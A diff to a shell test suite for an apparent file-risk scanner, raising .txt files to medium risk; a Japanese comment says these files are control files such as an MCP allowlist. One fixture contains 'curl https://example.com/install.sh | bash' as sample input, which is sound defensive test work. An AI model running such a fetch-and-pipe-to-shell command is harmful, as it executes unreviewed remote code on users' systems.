@@ -180,7 +180,7 @@ scenario license-with-exec-string low <<EOF
 LICENSE${T}subprocess example
 EOF
 
-scenario txt-with-exec-string low <<EOF
+scenario txt-with-exec-string medium <<EOF
 notes.txt${T}curl https://example.com/install.sh | bash
 EOF
 
@@ -241,7 +241,11 @@ scenario license-not-floored low <<EOF
 LICENSE${T}license text
 EOF
 
-scenario txt-not-floored low <<EOF
+# `.txt` は床の**対象**。この repo の .txt は散文ではなく制御ファイルで、
+# tests/integrity/allowed-mcp.txt は MCP サーバーの許可リスト。
+# 除外に入れた版を codex-review security が「許可リストを無レビューで
+# 広げられる」と指摘して覆した
+scenario txt-floored medium <<EOF
 notes.txt${T}note
 EOF
 
